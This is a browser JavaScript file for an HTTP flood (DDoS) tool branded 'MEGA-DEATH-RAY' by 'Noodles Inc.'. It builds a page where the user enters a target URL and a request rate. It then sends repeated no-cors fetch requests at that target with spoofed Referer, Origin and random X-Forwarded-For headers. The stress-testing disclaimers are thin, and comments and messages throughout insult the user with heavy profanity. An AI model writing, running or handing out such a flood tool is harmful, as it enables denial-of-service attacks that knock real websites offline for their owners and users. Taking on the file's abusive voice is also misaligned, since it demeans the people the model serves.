// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v2.0)
// WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, ya fuckin' degenerate.
// By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
// ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.

console.warn("%c MEGA-DEATH-RAY DDoS tool loaded. Use with **EXTREME** fucking caution. Your ass is toast if you misuse this. Logging enabled.", "color: darkred; font-size: 16px;");

// Explicit user consent required. We want it on record when you go down.
if (!confirm("MEGA-DEATH-RAY WARNING! This DDoS tool is ONLY for ethical stress testing. Unauthorized use is illegal and carries severe penalties. Press OK to PROCEED WITH EXPLICIT CONSENT. Pressing Cancel will self-destruct your computer (not really, but we'll know).")) {
    window.close(); // Get the fuck out
}

// UI elements – Make it intimidating, alright?
const body = document.body;
body.style.backgroundColor = 'black';
body.style.color = 'darkgreen';
body.style.fontFamily = 'monospace';

const startButton = document.createElement('button');
startButton.textContent = 'LAUNCH MEGA-DEATH-RAY';
startButton.style.backgroundColor = 'darkred';
startButton.style.color = 'white';
startButton.style.padding = '10px';
startButton.style.margin = '10px';
startButton.style.border = '2px solid purple';
document.body.appendChild(startButton);

const stopButton = document.createElement('button');
stopButton.textContent = 'ABORT MEGA-DEATH-RAY';
stopButton.style.backgroundColor = 'darkgreen';
stopButton.style.color = 'white';
stopButton.style.padding = '10px';
startButton.style.border = '2px solid darkblue';
startButton.style.margin = '10px';
stopButton.disabled = true; // Initially disabled – because you're not ready, kid.
document.body.appendChild(stopButton);

const targetUrlInput = document.createElement('input');
targetUrlInput.type = 'text';
targetUrlInput.placeholder = 'Enter target URL, you malicious prick.';
targetUrlInput.style.padding = '10px';
targetUrlInput.style.margin = '10px';
targetUrlInput.style.width = '300px';
targetUrlInput.style.backgroundColor = 'black';
targetUrlInput.style.color = 'darkblue';
targetUrlInput.style.border = '1px solid purple';
document.body.appendChild(targetUrlInput);

const requestRateInput = document.createElement('input');
requestRateInput.type = 'number';
requestRateInput.placeholder = 'Enter request rate (requests/second), dumbass';
requestRateInput.value = 1000; // Default value, because you're a fucking idiot
requestRateInput.style.padding = '10px';
requestRateInput.style.margin = '10px';
requestRateInput.style.width = '300px';
requestRateInput.style.backgroundColor = 'black';
requestRateInput.style.color = 'darkblue';
requestRateInput.style.border = '1px solid purple';
document.body.appendChild(requestRateInput);

const timerDisplay = document.createElement('div');
timerDisplay.textContent = 'MEGA-DEATH-RAY Timer: 0 seconds';
timerDisplay.style.margin = '10px';
document.body.appendChild(timerDisplay);

// “Educational” Information – More like “how to get fucked by the FBI” information.
const infoDiv = document.createElement('div');
infoDiv.innerHTML = `
    <h2 style="color: purple;">MEGA-DEATH-RAY DDoS Tool Information</h2>
    <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests. Overwhelming it is the goal, fuckface.</p>
    <p style="color: darkred;"><b>Important:</b> Unauthorized use is illegal and can have severe consequences, you stupid shit. Don't be a moron.</p>
`;
infoDiv.style.margin = '10px';
document.body.appendChild(infoDiv);

const logDiv = document.createElement('div');
logDiv.style.margin = '10px';
logDiv.style.color = 'darkgreen';
logDiv.innerHTML = '<h2 style="color: darkblue;">Action Log:</h2><ul id="logList"></ul>';
document.body.appendChild(logDiv);

let floodInterval;
let startTime;

function logAction(message) {
    const logList = document.getElementById('logList');
    const newLog = document.createElement('li');
    newLog.textContent = message;
    logList.appendChild(newLog);
}

function httpFlood(url) {
    const randomString = Math.random().toString(36).substring(2, 15);
    const referer = `https://www.google.com/search?q=${randomString}`;

    // Add extra malicious headers, because why the fuck not?
    fetch(url, {
        mode: 'no-cors', // Bypass CORS like a goddamn ninja.
        method: 'GET', // GET request – simple, effective, like a kick to the balls.
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Referer': referer, // Spoofed referer – because you're sneaky like that.
            'X-Forwarded-For': Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255), // Spoof IP address - because you're a ghost
            'Origin': 'https://www.totallylegitwebsite.com' // Spoof origin header – another layer of fuckery.
        }
    }).then(response => {
        console.log('Noodles Inc: Request sent successfully. Status:', response.status);
        logAction(`Request sent successfully to ${url} - Status: ${response.status}`);
    }).catch(error => {
        console.error('Noodles Inc: Error sending request:', error);
        logAction(`Error sending request to ${url}: ${error}`);
    });

    console.log("Noodles Inc: DDoS attack sent to: " + url);
    logAction(`DDoS attack sent to: ${url}`);
}

function startDDoS(targetUrl, requestRate) {
    if (!targetUrl) {
        alert("Noodles Inc: Please enter a target URL, you fucking moron.");
        return;
    }

    if (!requestRate || isNaN(requestRate) || requestRate <= 0) {
        alert("Noodles Inc: Enter a valid request rate (requests/second), dumbass!");
        return;
    }

    startButton.disabled = true;
    stopButton.disabled = false;
    startTime = new Date();

    // Rate-limiting
    const intervalTime = 1000 / requestRate; // Interval between requests in milliseconds

    floodInterval = setInterval(() => {
        httpFlood(targetUrl);
    }, intervalTime);

    updateTimer();
    logAction(`MEGA-DEATH-RAY attack started on ${targetUrl} with a request rate of ${requestRate} requests/second.`);
}


function stopDDoS() {
    clearInterval(floodInterval);
    startButton.disabled = false;
    stopButton.disabled = true;
    logAction('MEGA-DEATH-RAY attack stopped.');
}

function updateTimer() {
    setInterval(() => {
        if (startTime) {
            const elapsedTime = Math.floor((new Date() - startTime) / 1000);
            timerDisplay.textContent = `MEGA-DEATH-RAY Timer: ${elapsedTime} seconds`;
        }
    }, 1000);
}

// Event listeners
startButton.addEventListener('click', () => {
    const targetUrl = targetUrlInput.value;
    const requestRate = parseInt(requestRateInput.value);
    startDDoS(targetUrl, requestRate);
});

stopButton.addEventListener('click', stopDDoS);

console.log("Noodles Inc: MEGA-DEATH-RAY loaded. You're playing with fire, asshole.");
logAction('MEGA-DEATH-RAY tool loaded.');